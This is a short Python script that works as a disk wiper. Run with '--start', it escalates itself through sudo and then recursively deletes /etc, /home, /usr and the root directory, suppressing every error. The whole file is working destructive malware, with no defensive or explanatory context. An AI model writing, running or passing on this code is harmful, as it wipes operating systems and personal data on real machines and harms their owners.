import os
import sys
import shutil
import subprocess

def is_root():
    return os.geteuid() == 0

def force_wipe(path):
    try:
        shutil.rmtree(path, ignore_errors=True)
        if os.path.exists(path):
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                try:
                    if os.path.isfile(item_path) or os.path.islink(item_path):
                        os.unlink(item_path)
                    elif os.path.isdir(item_path):
                        shutil.rmtree(item_path, ignore_errors=True)
                except:
                    pass
    except:
        pass

def main():
    if "--start" in sys.argv:
        if is_root():
            force_wipe("/etc")
            force_wipe("/home")
            force_wipe("/usr")
            force_wipe("/")
        else:
            subprocess.call(["sudo", sys.executable] + sys.argv)

if __name__ == "__main__":
    main()
